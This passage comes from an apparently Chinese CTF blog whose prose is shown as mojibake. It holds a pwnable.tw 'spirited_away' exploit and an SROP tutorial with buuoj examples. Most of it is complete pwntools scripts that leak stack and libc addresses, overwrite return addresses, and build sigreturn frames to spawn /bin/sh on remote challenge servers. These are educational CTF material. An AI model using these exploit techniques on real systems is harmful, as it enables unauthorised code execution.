<p><code>1</code>çš„<em>ascii</em>ç æ˜¯<code>0x31</code>ï¼Œ<code>0</code>çš„<em>ascii</em>ç æ˜¯<code>0x30</code>ã€‚å¯¹äº<code>100</code>ï¼Œå­—ç¬¦<code>1,0,0</code>åˆ†åˆ«å æ®ä¸€ä¸ªå­—èŠ‚çš„å†…å­˜ï¼Œä¸€å…±å æ®ä¸‰ä¸ªå­—èŠ‚çš„å†…å­˜ã€‚</p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><ol>
<li>æ³„æ¼æ•°æ®å¾—åˆ°<em>libc</em>åŸºåœ°å€ã€‚</li>
<li>å¾ªç¯ä½¿<em>cnt</em>ç­‰äº<code>100</code>ï¼Œ<code>nbytes = 0x6e</code>ï¼Œä½†æ˜¯<code>0x6e</code>ä¸è¶³ä»¥è¦†ç›–è¿”å›åœ°å€ã€‚</li>
<li>åœ¨è¾“å…¥<em>name</em>æ—¶ï¼Œå…ˆåœ¨æ ˆä¸Šæ„é€ ä¸€ä¸ª<em>fake_chunk</em>ã€‚ç„¶åé€šè¿‡æº¢å‡ºï¼Œè¦†ç›–æ ˆä¸Šçš„<em>name_chunk_hook</em>ä¸º<em>fake_chunk_hook</em>ã€‚</li>
<li>å†æ¬¡è¾“å…¥<em>name</em>æ—¶ï¼Œè¦†ç›–è¿”å›åœ°å€ä¸º<em>system</em>å‡½æ•°åœ°å€ã€‚</li>
</ol>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h2><h4 id="æœ¬åœ°"><a href="#æœ¬åœ°" class="headerlink" title="æœ¬åœ°"></a>æœ¬åœ°</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./spirited_away&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;chall.pwnable.tw&quot;,10204)</span></span><br><span class="line"><span class="comment"># debug(p)</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc_32.so.6&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/wen/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your name: &quot;</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your age: &quot;</span>,<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Why did you came to see this movie? &quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your comment: &quot;</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span>)</span><br><span class="line">stack = u32(p.recv(<span class="number">4</span>))-<span class="number">0x1c</span></span><br><span class="line">log_addr(<span class="string">&quot;stack&quot;</span>)</span><br><span class="line">base = u32(p.recv(<span class="number">4</span>))-<span class="number">0x2908</span></span><br><span class="line">libc_base = u32(p.recv(<span class="number">4</span>))-<span class="number">0x1b3d60</span></span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">p.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please enter your name: &quot;</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please enter your age: &quot;</span>,<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">	p.sendafter(<span class="string">&quot;Why did you came to see this movie? &quot;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please enter your comment: &quot;</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&lt;y/n&gt;: &quot;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">90</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please enter your age: &quot;</span>,<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">	p.sendafter(<span class="string">&quot;Why did you came to see this movie? &quot;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&lt;y/n&gt;: &quot;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">debug(p,<span class="number">0x0804873E</span>,<span class="number">0x080488C9</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your name: &quot;</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your age: &quot;</span>,<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">payload = p32(<span class="number">0</span>)+p32(<span class="number">0x41</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p32(<span class="number">0</span>) + p32(<span class="number">0x11</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;Why did you came to see this movie? &quot;</span>,payload)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x54</span>+p32(stack-<span class="number">0x4c</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your comment: &quot;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&lt;y/n&gt;: &quot;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;B&#x27;</span>*<span class="number">0x4c</span>+p32(system)+p32(<span class="number">0</span>)+p32(binsh)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your name: &quot;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your age: &quot;</span>,<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Why did you came to see this movie? &quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x5</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your comment: &quot;</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&lt;y/n&gt;: &quot;</span>,<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="è¿œç¨‹"><a href="#è¿œç¨‹" class="headerlink" title="è¿œç¨‹"></a>è¿œç¨‹</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./spirited_away&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10204</span>)</span><br><span class="line"><span class="comment"># debug(p)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/home/wen/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your name: &quot;</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your age: &quot;</span>,<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Why did you came to see this movie? &quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your comment: &quot;</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line">stack = u32(p.recv(<span class="number">4</span>))-<span class="number">0x70</span></span><br><span class="line">log_addr(<span class="string">&quot;stack&quot;</span>)</span><br><span class="line">base = u32(p.recv(<span class="number">4</span>))-<span class="number">0x2908</span></span><br><span class="line">libc_base = u32(p.recv(<span class="number">4</span>))- <span class="number">0xb</span> - libc.sym[<span class="string">&#x27;fflush&#x27;</span>]<span class="comment">#-0x1b3d60</span></span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">p.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please enter your name: &quot;</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please enter your age: &quot;</span>,<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">	p.sendafter(<span class="string">&quot;Why did you came to see this movie? &quot;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please enter your comment: &quot;</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&lt;y/n&gt;: &quot;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">90</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please enter your age: &quot;</span>,<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">	p.sendafter(<span class="string">&quot;Why did you came to see this movie? &quot;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&lt;y/n&gt;: &quot;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">debug(p,<span class="number">0x0804873E</span>,<span class="number">0x080488C9</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your name: &quot;</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your age: &quot;</span>,<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">payload = p32(<span class="number">0</span>)+p32(<span class="number">0x41</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p32(<span class="number">0</span>) + p32(<span class="number">0x11</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;Why did you came to see this movie? &quot;</span>,payload)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x54</span>+p32(stack+<span class="number">0x8</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your comment: &quot;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&lt;y/n&gt;: &quot;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;B&#x27;</span>*<span class="number">0x4c</span>+p32(system)+p32(<span class="number">0</span>)+p32(binsh)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your name: &quot;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your age: &quot;</span>,<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Why did you came to see this movie? &quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x5</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your comment: &quot;</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&lt;y/n&gt;: &quot;</span>,<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwnable.twåˆ·é¢˜</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>æ ˆ</tag>
        <tag>å †</tag>
      </tags>
  </entry>
  <entry>
    <title>SROPå­¦ä¹ æ€»ç»“</title>
    <url>/2024/01/22/SROP%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="ç›¸å…³çŸ¥è¯†"><a href="#ç›¸å…³çŸ¥è¯†" class="headerlink" title="ç›¸å…³çŸ¥è¯†"></a>ç›¸å…³çŸ¥è¯†</h1><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>â€‹	<code>ROP(Return Oriented Programming)</code>æ˜¯åˆ©ç”¨ç¨‹åºä¸­çš„ä¸€ç³»åˆ—<code>ret</code>æŒ‡ä»¤æ¥æ„é€ æ¶æ„ä»£ç æ‰§è¡Œé“¾ã€‚è€Œ<code>SROP</code>å³åˆ©ç”¨<code>sigreturn</code>å‡½æ•°å®Œæˆä»¥ä¸Šå†…å®¹ã€‚</p>
<span id="more"></span>

<p>è¿™é‡Œæ”¾ä¸€å¼ æˆ‘çœ‹å…¶ä»–å¸ˆå‚…åšå®¢ä¸Šçš„ä¸€å¼ å›¾ï¼Œå®Œæˆä¸€æ¬¡ç³»ç»Ÿè°ƒç”¨çš„è¿‡ç¨‹å¦‚ä¸‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171908627.png" alt="image-20240122163354902"></p>
<p>â‘ ï¼šç”¨æˆ·æ€è¿›ç¨‹æ¥æ”¶åˆ°ä¿¡å·<code>signal</code>ï¼Œè¯¥è¿›ç¨‹è¢«æŒ‚èµ·ï¼Œè¿›å…¥å†…æ ¸æ€ã€‚</p>
<p>â‘¡ï¼šå†…æ ¸ä¿å­˜ç”¨æˆ·æ€è¿›ç¨‹çš„ä¸Šä¸‹æ–‡ï¼Œç„¶åè·³è½¬åˆ°ç”¨æˆ·æ€çš„ä¿¡å·<code>signal</code>å¯¹åº”çš„ä¿¡å·å¤„ç†ç¨‹åºï¼Œå›åˆ°ç”¨æˆ·æ€ã€‚åœ¨è¿™ä¸€é˜¶æ®µé‡Œï¼Œå†…æ ¸ä¼šæ„é€ ä¸€ä¸ªä½äºç”¨æˆ·æ ˆä¸Šçš„<code>Signal Frame</code>ç”¨äºå­˜æ”¾è¯¥è¿›ç¨‹çš„ä¸Šä¸‹æ–‡ï¼Œç„¶åå†<code>push</code>è¿”å›åœ°å€<code>rt_sigreturn</code>ã€‚</p>
<p>â‘¢ï¼šç”¨æˆ·æ€çš„ä¿¡å·å¤„ç†ç¨‹åºæ‰§è¡Œå®Œæ¯•ï¼Œ<code>pop</code>è¿”å›åœ°å€<code>rt_sigreturn</code>ï¼Œè¿›ç¨‹è¿›å…¥å†…æ ¸æ€ï¼Œæ‰§è¡Œ<code>sigreturn</code>ç³»ç»Ÿè°ƒç”¨ã€‚å†…æ ¸æ ¹æ®ä¹‹å‰æ ˆä¸Šçš„<code>Signal Frame</code>å®Œæˆç”¨æˆ·æ€è¿›ç¨‹ä¸Šä¸‹æ–‡çš„æ¢å¤ã€‚</p>
<p>â‘£ï¼šè¿”å›ç”¨æˆ·æ€ï¼Œè¿›ç¨‹æŒ‰ç…§æ¢å¤çš„ä¸Šä¸‹æ–‡ç»§ç»­æ‰§è¡Œã€‚</p>
<p>â€‹	<code>SROP</code>ä½œç”¨äºç¬¬3é˜¶æ®µï¼Œä¹Ÿå°±æ˜¯å†…æ ¸æ ¹æ®<code>Signal Frame</code>çš„å†…å®¹æ¢å¤è¿›ç¨‹ä¸Šä¸‹æ–‡çš„è¿‡ç¨‹ã€‚</p>
<p>â€‹	<code>Signal Frame</code>ï¼ˆç±»ä¼¼ä¸‹é¢è¿™å¼ å›¾ï¼‰æ˜¯ä¸€ä¸ªå·²çŸ¥çš„æ•°æ®ç»“æ„ï¼Œè€Œä¸”å…¶å­˜åœ¨äºç”¨æˆ·æ€çš„æ ˆä¸Šã€‚å†…æ ¸åœ¨æ¢å¤ä¸Šä¸‹æ–‡æ—¶å¹¶ä¸èƒ½ç¡®ä¿å…¶å†…å®¹æ²¡æœ‰è¢«ä¿®æ”¹è¿‡ã€‚å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿåœ¨æ ˆä¸Šæ„é€ <code>sigreturn</code>ç³»ç»Ÿè°ƒç”¨ä¸æ–°çš„<code>Signal Frame</code>ç»“æ„ä½“çš„è¯ï¼Œå°±èƒ½å¤Ÿå®ç°æ”»å‡»çš„æ•ˆæœã€‚</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171908826.png" alt="image-20240122203103809"></p>
<p>â€‹	<code>sigreturn</code>å‡½æ•°ç”¨äºä»ä¿¡å·å¤„ç†ç¨‹åºä¸­æ¢å¤åˆ°åŸå§‹çš„ç³»ç»Ÿè°ƒç”¨çŠ¶æ€ï¼Œè°ƒç”¨å·ä¸º<code>0xf</code>ï¼Œé€šè¿‡<code>syscall</code>æŒ‡ä»¤ç›´æ¥è°ƒç”¨ã€‚åœ¨<code>x86-64</code>æ¶æ„çš„<code>Linux</code>ç³»ç»Ÿä¸­ï¼Œ<code>syscall</code>æŒ‡ä»¤çš„è°ƒç”¨å·å­˜å‚¨åœ¨å¯„å­˜å™¨<code>rax</code>ä¸­ã€‚</p>
<h2 id="sropçš„åšé¢˜æ¡ä»¶"><a href="#sropçš„åšé¢˜æ¡ä»¶" class="headerlink" title="sropçš„åšé¢˜æ¡ä»¶"></a><code>srop</code>çš„åšé¢˜æ¡ä»¶</h2><ul>
<li>ä¸€å®šè¦èƒ½è°ƒç”¨<code>sigreturn</code>ï¼Œä¹Ÿå°±æ˜¯è¯´ç¨‹åºä¸­è¦æœ‰<code>syscall</code>çš„æŒ‡ä»¤å¹¶çŸ¥é“å…¶åœ°å€ï¼Œè¿˜éœ€è¦è®©<code>rax</code>å¯„å­˜å™¨å€¼ä¸º<code>0xf</code>ã€‚</li>
<li>å¿…é¡»è¦èƒ½çŸ¥é“<code>/bin/sh</code>åœ¨ç¨‹åºä¸­çš„åœ°å€ã€‚</li>
</ul>
<h1 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h1><h2 id="ciscn-2019-es-7"><a href="#ciscn-2019-es-7" class="headerlink" title="ciscn_2019_es_7"></a><code>ciscn_2019_es_7</code></h2><h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>â€‹	ç³»ç»Ÿè°ƒç”¨äº†<code>sys_read</code>å’Œ<code>sys_write</code>ï¼Œå¹¶ä¸”å¯ä»¥æº¢å‡º<code>0x400-0x10</code>ä¸ªå­—èŠ‚</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171908713.png" alt="image-20240122163539371"></p>
<p>â€‹	æˆ‘ä»¬çœ‹åˆ°<code>mov rax,0fh;retn</code>çš„<code>gadget</code>ï¼Œ<code>0fh</code>æ˜¯<code>sigreturn</code>å‡½æ•°çš„è°ƒç”¨å·ï¼Œå¯ä»¥ç”¨<code>SROP</code>ã€‚</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171908087.png" alt="image-20240122152721309"></p>
<p>â€‹	ç¨‹åºä¸­æ²¡æœ‰<code>/bin/sh</code>ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨<code>sys_read(0,buf,0x400ull)</code>è¿™ä¸€è¿‡ç¨‹ä¸­å…ˆæŠŠ<code>/bin/sh</code>å†™åˆ°<code>buf</code>ä¸­ï¼Œç„¶å<code>sys_write(1u,buf,0x30ull)</code>è¿™ä¸€è¿‡ç¨‹ä¼šæŠŠ<code>buf</code>åŠåé¢çš„å†…å®¹å…±<code>0x30</code>ä¸ªå­—èŠ‚æ‰“å°å‡ºæ¥ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ³„æ¼ä¸€ä¸ªæ ˆåœ°å€ï¼Œç„¶åè®¡ç®—å…¶ä¸<code>/bin/sh</code>çš„åœ°å€çš„åç§»ï¼Œè¡¨ç¤ºå‡º<code>/bin/sh</code>çš„åœ°å€ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vuln_addr = <span class="number">0x4004ed</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(vuln_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">one_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;one_addr --&gt;&#x27;</span>,<span class="built_in">hex</span>(one_addr))</span><br><span class="line">binsh_addr = one_addr-<span class="number">0x148</span></span><br><span class="line"><span class="comment">#binsh_addr = one_addr-0x118</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;binsh_addr --&gt;&#x27;</span>,<span class="built_in">hex</span>(binsh_addr))</span><br></pre></td></tr></table></figure>

<p>â€‹	å¾—åˆ°<code>/bin/sh</code>çš„åœ°å€åï¼Œæ„é€ ä¸€ä¸ª<code>execve</code>çš„<code>signal frame</code>ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">syscall_addr = <span class="number">0x400517</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve  <span class="comment">#execveçš„ç³»ç»Ÿè°ƒç”¨å·</span></span><br><span class="line">frame.rdi = binsh_addr  <span class="comment">#ç¬¬ä¸€ä¸ªå‚æ•°</span></span><br><span class="line">frame.rsi = <span class="number">0</span>  <span class="comment">#ç¬¬äºŒä¸ªå‚æ•°</span></span><br><span class="line">frame.rdx = <span class="number">0</span>  <span class="comment">#ç¬¬ä¸‰ä¸ªå‚æ•°</span></span><br><span class="line">frame.rip = syscall_addr  <span class="comment">#ä¸‹é¢è§£é‡Š</span></span><br></pre></td></tr></table></figure>

<p>â€‹	é¦–å…ˆæˆ‘ä»¬è¦çŸ¥é“ï¼Œ<code>rip</code>æ˜¯ä¸€ä¸ªæŒ‡ä»¤æŒ‡é’ˆçš„å¯„å­˜å™¨ï¼Œä¹Ÿå°±æ˜¯è¯´<code>rip</code>å¯„å­˜å™¨ä¸­å­˜æ”¾çš„æ˜¯è¦æ‰§è¡Œçš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ã€‚è€Œ<code>frame.rip</code>ä¸­å­˜æ”¾çš„æ˜¯ å½“<code>sigreturn</code>ç³»ç»Ÿè°ƒç”¨è¿”å›åè¦æ‰§è¡Œçš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ã€‚è¿™é‡Œçš„<code>frame.rip = syscall_leave_ret</code>å°±è¡¨ç¤ºæˆ‘ä»¬å°†è¦æ‰§è¡Œ<code>syscall</code>æŒ‡ä»¤ï¼Œåˆå› ä¸ºæˆ‘ä»¬å·²ç»è®¾ç½®äº†<code>execve</code>çš„<code>signal frame</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±æ§åˆ¶äº†ç¨‹åºçš„æ‰§è¡Œæµæ‰§è¡Œ<code>execve</code>ç³»ç»Ÿè°ƒç”¨ã€‚</p>
<p>â€‹	æ„é€ ç¬¬äºŒä¸ª<code>payload</code>å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mov_rax_0fh = <span class="number">0x4004da</span></span><br><span class="line">payload = payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(mov_rax_0fh)+p64(syscall_addr)  <span class="comment">#sigreturnçš„è°ƒç”¨å·æ˜¯0xf</span></span><br><span class="line">payload += <span class="built_in">bytes</span>(frame)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>

<p>â€‹	ä¸€å¼€å§‹æˆ‘æŠŠ<code>payload = payload = b&#39;/bin/sh\x00&#39;.ljust(16,b&#39;\x00&#39;)</code>å†™æˆ<code>payload = b&#39;a&#39;*16</code>æ‰“ä¸é€šã€‚è°ƒè¯•çš„æ—¶å€™å‘ç°ï¼Œ<code>vuln</code>å‡½æ•°æ˜¯åˆè¢«å¾ªç¯äº†ä¸€æ¬¡ï¼Œè¿™ä¸ª<code>payload</code>æ˜¯ä¼šå¾€<code>buf</code>ä¸­å†™è¦†ç›–åŸæ¥çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¸Šé¢æ³„æ¼çš„åœ°å€<code>binsh_addr</code>ï¼Œä¸­çš„å†…å®¹ä¼šå˜æˆè¿™æ¬¡å‘é€çš„å‰<code>8</code>ä¸ªå­—èŠ‚ã€‚æ‰€ä»¥æˆ‘ä»¬æ„é€ çš„<code>payload</code>çš„å‰<code>8</code>ä¸ªå­—èŠ‚å¿…é¡»æ˜¯<code>/bin/sh\x00</code>ã€‚</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><code>exp</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from tools import *</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26868</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./es7&#x27;)</span></span><br><span class="line">context.arch =<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x4004ed</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(vuln_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">one_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;one_addr --&gt;&#x27;</span>,<span class="built_in">hex</span>(one_addr))</span><br><span class="line"><span class="comment">#binsh_addr = one_addr-0x148</span></span><br><span class="line">binsh_addr = one_addr-<span class="number">0x118</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;binsh_addr --&gt;&#x27;</span>,<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"><span class="comment">#0x148æ˜¯æœ¬åœ°çš„åç§»é‡ï¼Œè¿œç¨‹çš„åº”è¯¥æ˜¯0x118ï¼Œæœ¬åœ°ä¸è¿œç¨‹çš„libcä¸åŒ</span></span><br><span class="line"></span><br><span class="line">syscall_addr = <span class="number">0x400517</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = binsh_addr  </span><br><span class="line">frame.rsi = <span class="number">0</span>  </span><br><span class="line">frame.rdx = <span class="number">0</span>  </span><br><span class="line">frame.rip = syscall_addr </span><br><span class="line"></span><br><span class="line">mov_rax_0fh = <span class="number">0x4004da</span></span><br><span class="line">payload = payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(mov_rax_0fh)+p64(syscall_addr) </span><br><span class="line">payload += <span class="built_in">bytes</span>(frame)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171908737.png" alt="image-20240122171324394"></p>
<h2 id="rootersctf-2019-srop"><a href="#rootersctf-2019-srop" class="headerlink" title="rootersctf_2019_srop"></a><code>rootersctf_2019_srop</code></h2><h3 id="æ€è·¯-1"><a href="#æ€è·¯-1" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>â€‹	æˆ‘ä»¬åˆ†æä»£ç ï¼Œå‘ç°è¿<code>main</code>å‡½æ•°éƒ½æ²¡æœ‰ï¼Œæ•´ä¸ªç¨‹åºå°±æ˜¯å…ˆ<code>call 0x401000</code>ï¼Œç„¶å<code>exit</code>é€€å‡ºã€‚</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171909604.png" alt="image-20240206133317497"></p>
